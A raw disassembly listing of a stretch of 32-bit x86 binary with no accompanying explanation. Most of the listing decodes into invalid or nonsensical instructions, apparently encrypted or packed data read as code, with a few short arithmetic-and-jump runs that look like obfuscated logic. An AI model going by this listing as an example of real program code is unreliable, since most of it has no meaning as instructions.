  40d15e:	jle    0x40d1ae
  40d160:	nop
  40d161:	(bad)  
  40d162:	mov    ds:0x4d77c3ef,al
  40d167:	push   0xab154888
  40d16c:	inc    ecx
  40d16d:	push   eax
  40d16e:	sar    bh,cl
  40d170:	push   ecx
  40d171:	push   ds
  40d172:	int3   
  40d173:	xchg   DWORD PTR [eax],ebx
  40d175:	mov    ch,0xb4
  40d177:	and    cl,dl
  40d179:	cmp    BYTE PTR [edi+0x14],al
  40d17c:	add    ecx,ecx
  40d17e:	jmp    0x40d1c4
  40d180:	nop
  40d181:	stos   DWORD PTR es:[edi],eax
  40d182:	xchg   edx,eax
  40d183:	jg     0x40d108
  40d185:	clc    
  40d186:	int    0x54
  40d188:	ins    BYTE PTR es:[edi],dx
  40d189:	loopne 0x40d163
  40d18b:	lds    ecx,FWORD PTR [edi-0x15]
  40d18e:	adc    esp,DWORD PTR [eax+0x53]
  40d191:	and    BYTE PTR [ecx+0x66],al
  40d194:	ss sahf 
  40d196:	jl     0x40d143
  40d198:	xchg   edx,eax
  40d199:	push   ds
  40d19a:	mov    ebp,0xc0b52e54
  40d19f:	aam    0x67
  40d1a1:	jo     0x40d146
  40d1a3:	iret   
  40d1a4:	cmp    DWORD PTR [ebp-0x29],esp
  40d1a7:	mov    esi,0x439ec5fd
  40d1ac:	loop   0x40d214
  40d1ae:	lds    ebp,FWORD PTR [eax+0x68]
  40d1b1:	xor    eax,0xc5da5f62
  40d1b6:	(bad)  
  40d1b7:	fcmove st,st(2)
  40d1b9:	ret    0x6e3
  40d1bc:	ret    
  40d1bd:	jb     0x40d1ca
  40d1bf:	hlt    
  40d1c0:	aas    
  40d1c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1c2:	sub    al,0x4c
  40d1c4:	pushw  ss
  40d1c6:	cwde   
  40d1c7:	dec    eax
  40d1c8:	iret   
  40d1c9:	or     ebx,DWORD PTR ds:0xa38100c6
  40d1cf:	hlt    
  40d1d0:	cli    
  40d1d1:	add    edi,ebp
  40d1d3:	lds    edi,FWORD PTR [ecx+0x4e]
  40d1d6:	jno    0x40d23a
  40d1d8:	mov    DWORD PTR ss:[edi+edx*2+0x60],esp
  40d1dd:	test   BYTE PTR [ebp+0x33],dh
  40d1e0:	rol    BYTE PTR [ebx],1
  40d1e2:	ror    DWORD PTR [edi],1
  40d1e4:	scas   eax,DWORD PTR es:[edi]
  40d1e5:	xlat   BYTE PTR ds:[ebx]
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	repz pop ebx
  40d210:	jmp    0x40d27b
  40d212:	(bad)  
  40d213:	call   0x7e7e:0x79707e7e
  40d21a:	cli    
  40d21b:	mov    dl,0x6b
  40d21d:	mov    cl,0x12
  40d21f:	mov    ch,0x45
  40d221:	int    0xe5
  40d223:	and    eax,edx
  40d225:	mov    ss,WORD PTR [edi+0x22db19f]
  40d22b:	pop    edi
  40d22c:	push   edi
  40d22d:	nop
  40d22e:	mov    edx,0x22ee5990
  40d233:	dec    esi
  40d234:	or     DWORD PTR ds:0xb0b48f2c,ebp
  40d23a:	cmp    dl,dl
  40d23c:	jp     0x40d23e
  40d23e:	in     al,0xf0
  40d240:	cmc    
  40d241:	into   
  40d242:	push   ebp
  40d243:	mov    ds,WORD PTR [ebx]
  40d245:	and    BYTE PTR [ebp+ebx*8+0x5d],bh
  40d249:	lds    edx,FWORD PTR [esi-0x2f097256]
  40d24f:	sub    ebp,ebx
  40d251:	gs push cs
  40d253:	mov    ds:0xdfe72461,eax
  40d258:	cdq    
  40d259:	jmp    0x29b545f3
  40d25e:	ror    BYTE PTR [edx],0xce
  40d261:	fs push ss
  40d263:	arpl   WORD PTR es:[ebx+ecx*2],bp
  40d267:	(bad)  
  40d268:	aas    
  40d269:	or     BYTE PTR [edi+ecx*1-0x39],bl
  40d26d:	mov    WORD PTR [esi],?
  40d26f:	xchg   ecx,eax
  40d270:	ret    0x742a
  40d273:	pop    edx
  40d274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d275:	nop
  40d276:	outs   dx,DWORD PTR ds:[esi]
  40d277:	ret    0x6799
  40d27a:	mov    bh,0x5f
  40d27c:	fwait
  40d27d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d27f:	inc    ecx
  40d281:	fisub  WORD PTR [eax-0xc]
  40d284:	add    bl,BYTE PTR [ebx+0x2]
  40d287:	int3   
  40d288:	imul   edx,DWORD PTR [ebp+0x67],0xf59ba60
  40d28f:	adc    DWORD PTR [ecx+0x6ad70bd],ebp
  40d295:	or     edi,DWORD PTR [ebx+0x3510a10e]
  40d29b:	lds    bx,DWORD PTR [ebx-0x45ce00fe]
  40d2a2:	bound  ebp,QWORD PTR [edx+ecx*4]
  40d2a5:	mov    esp,0x56c282f6
  40d2aa:	or     esi,esp
  40d2ac:	or     DWORD PTR [ebx-0x5d8ade55],edi
  40d2b2:	loope  0x40d242
  40d2b4:	push   0x29
  40d2b6:	lods   al,BYTE PTR ds:[esi]
  40d2b7:	pop    ebp
  40d2b8:	(bad)  
  40d2b9:	pushf  
  40d2ba:	jnp    0x40d244
  40d2bc:	pop    es
  40d2bd:	aam    0x16
  40d2bf:	dec    esp
  40d2c0:	mov    esi,DWORD PTR [edx-0x1b4459d]
  40d2c6:	out    0x93,al
  40d2c8:	pop    ecx
  40d2c9:	stc    
  40d2ca:	dec    esi
  40d2cb:	cs inc edx
  40d2cd:	out    0xca,al
  40d2cf:	adc    eax,0x64ba7687
  40d2d4:	dec    ebx
  40d2d5:	push   ebx
  40d2d6:	fs inc ebp
  40d2d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2d9:	mov    ds:0xe9291430,eax
  40d2de:	das    
  40d2df:	mov    eax,ds:0x75ed5557
  40d2e4:	cmp    DWORD PTR [esi-0x3b],esp
  40d2e7:	out    0xf6,eax
  40d2e9:	jge    0x40d26e
  40d2eb:	ss pop ds
  40d2ed:	sbb    eax,0x26ab0bf0
  40d2f2:	aam    0x86
  40d2f4:	mov    ds:0x91438b12,eax
  40d2f9:	jmp    0xb3f18a5e
  40d2fe:	les    edi,FWORD PTR [ecx]
  40d300:	scas   eax,DWORD PTR es:[edi]
  40d301:	mov    ah,0x37
  40d303:	push   ss
  40d304:	fisttp WORD PTR [edi]
  40d306:	inc    esi
  40d307:	push   ebx
  40d308:	in     al,dx
  40d309:	jnp    0x40d327
  40d30b:	mov    bh,0x9e
  40d30d:	ins    DWORD PTR es:[edi],dx
  40d30e:	or     ebp,DWORD PTR [edi]
  40d310:	(bad)  
  40d311:	jp     0x40d2fa
  40d313:	popa   
  40d314:	in     eax,0x26
  40d316:	or     al,0xf5
  40d318:	cmc    
  40d319:	lods   al,BYTE PTR ds:[esi]
  40d31a:	pop    esp
  40d31b:	std    
  40d31c:	scas   eax,DWORD PTR es:[edi]
  40d31d:	push   edx
  40d31e:	sub    al,0xc2
  40d320:	lods   al,BYTE PTR ds:[esi]
  40d321:	inc    edi
  40d322:	mov    edi,0x95716928
  40d327:	dec    esp
  40d328:	int    0xee
  40d32a:	dec    esp
  40d32b:	mov    cl,0xce
  40d32d:	mov    eax,ds:0x1e28a0a6
  40d332:	cmp    ebp,0x17
  40d335:	enter  0xd0c7,0x7d
  40d339:	xor    cl,BYTE PTR [eax+esi*8]
  40d33c:	pop    eax
  40d33d:	xchg   edi,eax
  40d33e:	mov    DWORD PTR [ebx],ecx
  40d340:	sub    ebx,DWORD PTR [edi-0x47]
  40d343:	ret    0x5ea5
  40d346:	adc    edx,edi
  40d348:	xor    dh,dl
  40d34a:	jmp    0x291c716b
  40d34f:	mov    edi,0xc6a81116
  40d354:	mov    al,0xa7
  40d356:	cmp    eax,DWORD PTR [edi-0x57]
  40d359:	aaa    
  40d35a:	(bad)  
  40d35b:	pushf  
  40d35c:	dec    esi
  40d35d:	pop    ebx
  40d35e:	enter  0x759d,0xc6
  40d362:	jecxz  0x40d37a
  40d364:	xor    eax,DWORD PTR [esi]
  40d366:	push   0x590c3c22
  40d36b:	push   es
  40d36c:	(bad)  
  40d36d:	or     eax,0xb836cdd7
  40d372:	mov    ecx,0x7937fdc9
  40d377:	call   0x1f948f99
  40d37c:	lods   al,BYTE PTR ds:[esi]
  40d37d:	loop   0x40d3f5
  40d37f:	cmp    BYTE PTR [edx],dh
  40d381:	imul   edx,DWORD PTR [esp+ebp*8+0x2a3d272b],0xffffffc3
  40d389:	test   BYTE PTR ds:0xd6c4f260,0x2d
  40d390:	test   BYTE PTR [esi],0x31
  40d393:	lea    ebp,[edi]
  40d395:	or     eax,0x846cd069
  40d39a:	outs   dx,DWORD PTR ds:[esi]
  40d39b:	mov    esp,0x752fca16
  40d3a0:	sub    DWORD PTR [ebp-0x15],edx
  40d3a3:	ret    
  40d3a4:	sbb    DWORD PTR [esi],esi
  40d3a6:	inc    ebx
  40d3a7:	sbb    al,0xaf
  40d3a9:	js     0x40d3b7
  40d3ab:	add    DWORD PTR [ecx],0x127c501
  40d3b1:	or     bl,BYTE PTR [edx+esi*4-0x7a]
  40d3b5:	popa   
  40d3b6:	sub    eax,0x18f820ee
  40d3bb:	add    ch,BYTE PTR [edx-0x4e2c07e2]
  40d3c1:	outs   dx,BYTE PTR ds:[esi]
  40d3c2:	dec    edi
  40d3c3:	loope  0x40d3b6
  40d3c5:	dec    esi
  40d3c6:	push   0xffffff97
  40d3c8:	cli    
  40d3c9:	dec    esp
  40d3ca:	or     ebx,DWORD PTR [edx-0x68c180fd]
  40d3d0:	pop    ecx
  40d3d1:	loope  0x40d441
  40d3d3:	adc    al,0x36
  40d3d5:	mov    dh,0x95
  40d3d7:	out    0x41,al
  40d3d9:	xchg   ebp,eax
  40d3da:	cli    
  40d3db:	jb     0x40d40d
  40d3dd:	(bad)  [edx+0x5fbdd74c]
  40d3e3:	sub    esi,ecx
  40d3e5:	mov    edx,0x9ae1e268
  40d3ea:	gs das 
  40d3ec:	into   
  40d3ed:	sub    BYTE PTR [edx+0x48a8b9d],cl
  40d3f3:	repnz (bad) 
  40d3f5:	in     eax,0x36
  40d3f7:	stc    
  40d3f8:	loope  0x40d436
  40d3fa:	fisubr WORD PTR [ebp+0xa]
  40d3fd:	sbb    ch,BYTE PTR [edx+0x6457b39c]
  40d403:	jno    0x40d3e7
  40d405:	xchg   ebx,eax
  40d406:	fwait
  40d407:	aaa    
  40d408:	mov    dl,0x45
  40d40a:	jns    0x40d450
  40d40c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d40d:	imul   BYTE PTR [ebx+0x4d]
  40d410:	jne    0x40d450
  40d412:	pop    es
  40d413:	int    0xb0
  40d415:	aaa    
  40d416:	mov    ebp,0x2b39cd5
  40d41b:	popf   
  40d41c:	add    ah,0x36
  40d41f:	leave  
  40d420:	popf   
  40d421:	test   al,ah
  40d423:	mov    al,ds:0x190f4479
  40d428:	js     0x40d3c4
  40d42a:	jmp    0xe2ab:0x6845c710
  40d431:	sti    
  40d432:	cld    
  40d433:	mov    ds:0xb926cb87,al
  40d438:	xor    DWORD PTR [edi],esp
  40d43a:	fwait
  40d43b:	push   ecx
  40d43c:	imul   ebx,DWORD PTR [esi+esi*1+0x4b],0x6d4f0dd5
  40d444:	mov    cl,0x6b
  40d446:	mov    ah,bh
  40d448:	std    
  40d449:	out    0x51,eax
  40d44b:	out    dx,al
  40d44c:	xor    edi,DWORD PTR [ecx-0x3a]
  40d44f:	mov    WORD PTR [edi-0x6f7b3868],fs
  40d455:	mov    ds:0xe0f358f2,al
  40d45a:	nop
  40d45b:	(bad)  
  40d45c:	aaa    
  40d45d:	gs pop ss
  40d45f:	pop    ds
  40d460:	xor    al,0x3e
  40d462:	dec    edi
  40d463:	fisubr WORD PTR [edx+ebp*4+0x78]
  40d467:	int3   
  40d468:	scas   eax,DWORD PTR es:[edi]
  40d469:	rsm    
  40d46b:	ror    DWORD PTR [esi+eiz*1-0x7e],cl
  40d46f:	xor    BYTE PTR [ecx-0x57],ah
  40d472:	pusha  
  40d473:	or     al,0x43
  40d475:	push   ss
  40d476:	cli    
  40d477:	mov    eax,ds:0xa401e4ca
  40d47c:	sbb    dh,ch
  40d47e:	test   BYTE PTR [ebx+edx*8],dh
  40d481:	clc    
  40d482:	aam    0x22
  40d484:	cmp    bh,0xb8
  40d487:	pop    ecx
  40d488:	mov    al,0x7
  40d48a:	cmp    al,0x85
  40d48c:	push   cs
  40d48d:	mov    ch,0x89
  40d48f:	ror    BYTE PTR [edx+0x1a50a3fa],1
  40d495:	sbb    esi,ecx
  40d497:	dec    ebp
  40d498:	mov    bl,0xaa
  40d49a:	sbb    BYTE PTR [ecx],ch
  40d49c:	mov    BYTE PTR [eax+0x1c],0x93
  40d4a0:	(bad)  
  40d4a1:	mov    fs,WORD PTR [esi+0x75]
  40d4a4:	xchg   edx,eax
  40d4a5:	push   esp
  40d4a6:	or     eax,0xff8e6606
  40d4ab:	test   WORD PTR [ecx+0x73],ax
  40d4af:	mov    edx,0x98445446
  40d4b4:	mov    ds:0xa22c7148,eax
  40d4b9:	shr    bl,1
  40d4bb:	mov    ch,0x21
  40d4bd:	lods   al,BYTE PTR ds:[esi]
  40d4be:	ret    
  40d4bf:	xchg   BYTE PTR [esi+0x21],al
  40d4c2:	mov    edi,0x320707ac
  40d4c7:	inc    ebp
  40d4c8:	xchg   ebp,eax
  40d4c9:	scas   al,BYTE PTR es:[edi]
  40d4ca:	aas    
  40d4cb:	add    ecx,0x5e
  40d4ce:	pop    esi
  40d4cf:	xchg   BYTE PTR [esi],ah
  40d4d1:	pop    ebx
  40d4d2:	dec    edi
  40d4d3:	mov    DWORD PTR [ebp+0x77],eax
  40d4d6:	push   esi
  40d4d7:	pop    ss
  40d4d8:	bound  edx,QWORD PTR [eax]
  40d4da:	jge    0x40d465
  40d4dc:	mov    al,0x2c
  40d4de:	fild   QWORD PTR [ecx+edi*4+0x4c00b50e]
  40d4e5:	dec    ebp
  40d4e6:	mov    dh,0xb5
  40d4e8:	not    al
  40d4ea:	sbb    BYTE PTR [ecx],cl
  40d4ec:	std    
  40d4ed:	xor    eax,0x1d157c24
  40d4f2:	pop    edi
  40d4f3:	or     ebp,DWORD PTR [esi+0x6]
  40d4f6:	mov    cl,0x5a
  40d4f8:	cs cmp bh,ch
  40d4fb:	dec    edi
  40d4fc:	jne    0x40d56d
  40d4fe:	callw  0xce5f
  40d502:	jmp    0x919c8f74
  40d507:	mov    bh,0xeb
  40d509:	pop    ds
  40d50a:	lock stos DWORD PTR es:[edi],eax
  40d50c:	fwait
  40d50d:	in     al,0xac
  40d50f:	push   es
  40d510:	bound  ecx,QWORD PTR [edx-0x4c]
  40d513:	push   edx
  40d514:	psrld  mm3,mm7
  40d517:	adc    esi,eax
  40d519:	sub    al,BYTE PTR [ebx+0x48]
  40d51c:	mov    bh,0x69
  40d51e:	xchg   ebx,eax
  40d51f:	pop    ebx
  40d520:	test   eax,0xd9135818
  40d525:	loop   0x40d57b
  40d527:	push   ecx
  40d528:	retf   
  40d529:	sub    bl,ch
  40d52b:	mov    ebp,0xa7d7e6c2
  40d530:	dec    esi
  40d531:	xchg   esp,eax
  40d532:	loopne 0x40d576
  40d534:	in     al,dx
  40d535:	int    0x3f
  40d537:	mov    esp,0xe80eaafe
  40d53c:	dec    eax
  40d53d:	int    0x5b
  40d53f:	dec    BYTE PTR [ecx-0x75b1aa9e]
  40d545:	mov    ch,0xad
  40d547:	jp     0x40d56c
  40d549:	in     al,0xff
  40d54b:	(bad)  
  40d54c:	xchg   edx,eax
  40d54d:	pop    ebp
  40d54e:	sti    
  40d54f:	pushf  
  40d550:	pop    edx
  40d551:	xchg   ecx,eax
  40d552:	push   ecx
  40d553:	inc    eax
  40d554:	hlt    
  40d555:	in     eax,0x6
  40d557:	fs test eax,0x18094735
  40d55d:	pop    ds
  40d55e:	popa   
  40d55f:	ss ja  0x40d4fe
  40d562:	out    dx,al
  40d563:	pop    es
  40d564:	pop    esp
  40d565:	cmp    eax,0xedf3af9d
  40d56a:	dec    ecx
  40d56b:	(bad)  
  40d56d:	cs dec ecx
  40d56f:	add    bl,BYTE PTR [esi+0x1c]
  40d572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d573:	iret   
  40d574:	fidiv  DWORD PTR [ebp+0x72]
  40d577:	and    ch,al
  40d579:	mov    ds:0x39e622b1,al
  40d57e:	and    edi,esi
  40d580:	cmp    eax,0xa0da98e0
  40d585:	test   eax,0xeef7a755
  40d58a:	add    eax,0x6e613ef5
  40d58f:	mov    al,0x4b
  40d591:	push   esi
  40d592:	fdivr  st(4),st
  40d594:	popa   
  40d595:	(bad)  
  40d597:	xchg   ecx,eax
  40d598:	in     al,0x93
  40d59a:	mov    bh,0x63
  40d59c:	ins    DWORD PTR es:[edi],dx
  40d59d:	jg     0x40d5f5
  40d59f:	push   ecx
  40d5a0:	call   0xf2b7abae
  40d5a5:	xchg   esi,eax
  40d5a6:	xor    BYTE PTR [edi+eax*8-0x19],dl
  40d5aa:	rcl    DWORD PTR [edi],1
  40d5ac:	push   ecx
  40d5ad:	mov    ?,WORD PTR [ecx-0x6f]
  40d5b0:	jns    0x40d566
  40d5b2:	(bad)  
  40d5b3:	loop   0x40d5c6
  40d5b5:	popf   
  40d5b6:	adc    al,0xa7
  40d5b8:	mov    cl,0xb2
  40d5ba:	jne    0x40d5c1
  40d5bc:	mov    fs,WORD PTR ds:0xdaba5371
  40d5c2:	pop    es
  40d5c3:	std    
  40d5c4:	nop
  40d5c5:	xchg   ebp,eax
  40d5c6:	sbb    eax,0x942d4805
  40d5cb:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40d5cd:	pop    edx
  40d5ce:	or     bh,BYTE PTR [ebp+0x563841b9]
  40d5d4:	outs   dx,BYTE PTR ds:[esi]
  40d5d5:	jecxz  0x40d5c5
  40d5d7:	sbb    eax,ebp
  40d5d9:	and    BYTE PTR [ecx-0x6892e5a6],bl
  40d5df:	fstp   DWORD PTR [edx-0x13]
  40d5e2:	popa   
  40d5e3:	rcr    BYTE PTR [ebp-0x55],cl
  40d5e6:	retf   
  40d5e7:	mov    ds:0xb8a3d358,al
  40d5ec:	xchg   ebx,eax
  40d5ed:	mov    ecx,0x4ded070a
  40d5f2:	mov    DWORD PTR [edi+0x49180ba9],0x50725b6a
  40d5fc:	fcmovb st,st(2)
  40d5fe:	ret    
  40d5ff:	adc    dh,BYTE PTR [edi]
  40d601:	ret    0xfd09
  40d604:	adc    DWORD PTR [ebx-0x40],ebp
  40d607:	push   cs
  40d608:	shl    esp,1
  40d60a:	ror    DWORD PTR [edi],1
  40d60c:	xchg   esi,eax
  40d60d:	xor    esp,ecx
  40d60f:	pop    esp
  40d610:	test   eax,0x3348b141
  40d615:	fsubr  DWORD PTR [ebx]
  40d617:	ror    DWORD PTR [ebp+0x72991fbc],1
  40d61d:	xor    al,BYTE PTR [eax]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x4b193998
  40d64b:	repnz cmp BYTE PTR [esi+0x79707e7e],ah
  40d652:	jle    0x40d6d2
  40d654:	push   0x31f1d1db
  40d659:	push   es
  40d65a:	jp     0x40d63e
  40d65c:	push   edx
  40d65d:	pop    ds
  40d65e:	push   ds
  40d65f:	mov    esp,0x5adace3e
  40d664:	or     ebp,DWORD PTR [ebx+0x4ea94f93]
  40d66a:	sahf   
  40d66b:	mov    esp,0xd243f534
  40d670:	mov    eax,ds:0x699f3937
  40d675:	std    
  40d676:	call   0x31e1683a
  40d67b:	cwde   
  40d67c:	push   eax
  40d67d:	icebp  
  40d67e:	adc    DWORD PTR [ebx+0x6c],edx
  40d681:	aad    0x12
  40d683:	push   ss
  40d684:	out    0x5,eax
  40d686:	add    eax,0xa8012601
  40d68b:	call   0xd363:0x87bf0f51
  40d692:	sahf   
  40d693:	bound  ebp,QWORD PTR [si+0x35]
  40d697:	xlat   BYTE PTR ds:[ebx]
  40d698:	push   es
  40d699:	mov    eax,ds:0x89aa04d5
  40d69e:	call   0xbac94fc4
  40d6a3:	mov    edi,0x1ae8aac7
  40d6a8:	out    0x13,al
  40d6aa:	popa   
  40d6ab:	popf   
  40d6ac:	dec    esi
  40d6ad:	inc    eax
  40d6ae:	int    0xd5
  40d6b0:	clc    
  40d6b1:	and    BYTE PTR [ecx-0x6c],ah
  40d6b4:	sub    bh,BYTE PTR [edi-0x678bc469]
  40d6ba:	and    edi,DWORD PTR [edi]
  40d6bc:	mov    esp,0xa5df3977
  40d6c1:	add    ecx,DWORD PTR [ebp-0x618eb3a8]
  40d6c7:	add    DWORD PTR [eax-0x47364e9a],edx
  40d6cd:	xchg   bh,ah
  40d6cf:	push   ecx
  40d6d0:	mov    cl,BYTE PTR [ebp-0x5ad841c2]
  40d6d6:	mov    edx,0xabb7abb5
  40d6db:	in     eax,dx
  40d6dc:	mov    eax,ds:0x2fba1f4c
  40d6e1:	or     BYTE PTR [edx],cl
  40d6e3:	addr16 ret 0xe19
  40d6e7:	or     edi,esi
  40d6e9:	inc    ebx
  40d6ea:	jmp    0xc3db231f
  40d6ef:	pop    ebx
  40d6f0:	and    ebx,DWORD PTR [edx+0x5c]
  40d6f3:	pop    esi
  40d6f4:	test   bl,al
  40d6f6:	jmp    0x6d9d:0x8fdbf98
  40d6fd:	iret   
  40d6fe:	pop    edi
  40d6ff:	int3   
  40d700:	test   ah,ah
  40d702:	arpl   WORD PTR [edi-0x4d],dx
  40d705:	inc    ebx
  40d706:	lahf   
  40d707:	or     al,0x63
  40d709:	push   ds
  40d70a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d70b:	daa    
  40d70c:	imul   esi,DWORD PTR [esi-0x2b237080],0x83dd8bed
  40d716:	ret    
  40d717:	mov    al,0x49
  40d719:	enter  0x2cee,0x79
  40d71d:	or     dh,BYTE PTR [ebx+0xa11df86]
  40d723:	adc    DWORD PTR [ebx-0x252f7fda],ebp
  40d729:	xor    al,0x54
  40d72b:	ds pop ecx
  40d72d:	mov    edi,0x4045b5e2
  40d732:	mov    WORD PTR [edi+0x715c5220],gs
  40d738:	mov    ecx,0x5c10c5ca
  40d73d:	fwait
  40d73e:	adc    al,cl
  40d740:	fsub   QWORD PTR [ebx+0x19]
  40d743:	cld    
  40d744:	les    edi,FWORD PTR [esi+eiz*4]
  40d747:	lock pop eax
  40d749:	fld    QWORD PTR [ebp-0x64e3b6fc]
  40d74f:	pop    esi
  40d750:	repnz lods eax,DWORD PTR ds:[esi]
  40d752:	add    eax,0x3ddbe951
  40d757:	in     al,dx
  40d758:	inc    edx
  40d759:	(bad)  
  40d75a:	out    dx,eax
  40d75b:	push   0x8d9534e3
  40d760:	(bad)  
  40d761:	mov    BYTE PTR ds:0x3c156f4b,al
  40d767:	iret   
  40d768:	jle    0x40d791
  40d76a:	cdq    
  40d76b:	in     eax,0xf1
  40d76d:	ret    
  40d76e:	std    
  40d76f:	stc    
  40d770:	dec    edi
  40d771:	int3   
  40d772:	test   BYTE PTR [eax-0x30b7b0ec],bl
  40d778:	call   0x1b56:0x24df6fa4
  40d77f:	std    
  40d780:	nop
  40d781:	test   al,0x63
  40d783:	pop    ds
  40d784:	xchg   ebx,eax
  40d785:	mov    ds:0x21056013,al
  40d78a:	jl     0x40d7f7
  40d78c:	push   ss
  40d78d:	(bad)  
  40d78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d78f:	lods   eax,DWORD PTR ds:[esi]
  40d790:	addr16 icebp 
  40d792:	les    ebp,FWORD PTR [edx]
  40d794:	imul   BYTE PTR [ebx+ebx*2]
  40d797:	pop    esi
  40d798:	aad    0x72
  40d79a:	pop    es
  40d79b:	dec    edi
  40d79c:	jmp    0xbfd78c1e
  40d7a1:	jmp    0x2a34:0x896b3052
  40d7a8:	cli    
  40d7a9:	test   eax,0xdf477844
  40d7ae:	xchg   esi,eax
  40d7af:	sub    ebx,ebp
  40d7b1:	ror    DWORD PTR [ebx],cl
  40d7b3:	dec    edx
  40d7b4:	sub    DWORD PTR [ebp+0xd],eax
  40d7b7:	mov    ebx,0xa47e9670
  40d7bc:	push   eax
  40d7bd:	iret   
  40d7be:	inc    esi
  40d7bf:	pop    eax
  40d7c0:	push   esi
  40d7c1:	or     ch,dl
  40d7c3:	dec    edi
  40d7c4:	lock sub ebp,0xec73004f
  40d7cb:	dec    edi
  40d7cc:	add    al,0x13
  40d7ce:	mov    ebx,0xc5bd9409
  40d7d3:	mov    ebp,DWORD PTR [ecx-0x78]
  40d7d6:	mov    ch,0xa5
  40d7d8:	push   ss
  40d7d9:	mov    edi,0xd14e843a
  40d7de:	test   eax,0x4f26e9f9
  40d7e3:	loopne 0x40d7f9
  40d7e5:	sbb    ebp,esp
  40d7e7:	mov    esi,0x53e374e6
  40d7ec:	test   DWORD PTR [ebx+0x22],0x9529b908
  40d7f3:	lods   al,BYTE PTR ds:[esi]
  40d7f4:	icebp  
  40d7f5:	scas   eax,DWORD PTR es:[edi]
  40d7f6:	mov    al,ds:0x775e8631
  40d7fb:	add    al,0xe2
  40d7fd:	int    0x8f
  40d7ff:	(bad)  
  40d800:	dec    esp
  40d801:	cdq    
  40d802:	and    al,0x54
  40d804:	sub    ah,bh
  40d806:	fidivr DWORD PTR [eax+0x7d08d10e]
  40d80c:	dec    ebx
  40d80d:	cmp    BYTE PTR cs:[ebp+0x3a],0x47
  40d812:	cs mov ax,0xc748
  40d817:	jl     0x40d7b5
  40d819:	mov    cl,0x6b
  40d81b:	sbb    ch,BYTE PTR [eax]
  40d81d:	jb     0x40d83f
  40d81f:	ret    
  40d820:	and    ebx,DWORD PTR [ebx]
  40d822:	push   edi
  40d823:	jge    0x40d7e5
  40d825:	mov    bh,0x47
  40d827:	jmp    0xe2daecdf
  40d82c:	pop    ecx
  40d82d:	cmp    DWORD PTR [edx],edx
  40d82f:	(bad)  
  40d831:	push   0x7f
  40d833:	add    edi,DWORD PTR [ebp+0x2bf57c17]
  40d839:	pop    esi
  40d83a:	jp     0x40d7e1
  40d83c:	push   esi
  40d83d:	adc    eax,0xcad29173
  40d842:	push   ebp
  40d843:	inc    edi
  40d844:	xchg   edi,eax
  40d845:	push   es
  40d846:	pushf  
  40d847:	shl    BYTE PTR [ebx],0x6a
  40d84a:	jnp    0x40d82c
  40d84c:	mov    eax,0xac10d577
  40d851:	stos   BYTE PTR es:[edi],al
  40d852:	push   es
  40d853:	scas   al,BYTE PTR es:[edi]
  40d854:	lods   eax,DWORD PTR ds:[esi]
  40d855:	arpl   WORD PTR [eax],sp
  40d857:	or     al,0xd9
  40d859:	ja     0x40d8af
  40d85b:	pop    ds
  40d85c:	stos   DWORD PTR es:[edi],eax
  40d85d:	pop    ebp
  40d85e:	cmp    BYTE PTR [edi-0x6d],al
  40d861:	mov    ebx,0x957d6223
  40d866:	loopne 0x40d85c
  40d868:	xor    ecx,DWORD PTR ds:0x2b2098a0
  40d86e:	loop   0x40d8b1
  40d870:	js     0x40d8a3
  40d872:	sahf   
  40d873:	(bad)  
  40d874:	(bad)  
  40d875:	loope  0x40d878
  40d877:	test   DWORD PTR [edx-0x14],ebp
  40d87a:	sahf   
  40d87b:	adc    al,0x7c
  40d87d:	or     BYTE PTR [edi],dh
  40d87f:	mov    WORD PTR [ebx],ds
  40d881:	jo     0x40d873
  40d883:	mov    ch,0x0
  40d885:	xor    eax,DWORD PTR fs:[ebx-0x75d2b196]
  40d88c:	jg     0x40d900
  40d88e:	aad    0xc0
  40d890:	shl    DWORD PTR [esi+0x29f1fbfd],cl
  40d896:	outs   dx,DWORD PTR ds:[esi]
  40d897:	push   eax
  40d898:	and    esi,ebp
  40d89a:	adc    eax,0x1b0e7caa
  40d89f:	mov    dh,0xd8
  40d8a1:	mov    DWORD PTR [eax],edx
  40d8a3:	jmp    0x40d8d0
  40d8a5:	lock div BYTE PTR [esi+0x5f]
  40d8a9:	pop    eax
  40d8aa:	outs   dx,BYTE PTR ds:[esi]
  40d8ab:	sub    DWORD PTR [ebp+0x4f92e618],edi
  40d8b1:	push   ebp
  40d8b2:	(bad)
  40d8b5:	xor    edx,ebp
  40d8b7:	cs cwde 
  40d8b9:	fisttp DWORD PTR [edx+0x7c]
  40d8bc:	jl     0x40d936
  40d8be:	hlt    
  40d8bf:	les    eax,FWORD PTR [ebx+0x1d]
  40d8c2:	jg     0x40d8f4
  40d8c4:	inc    ecx
  40d8c5:	int3   
  40d8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
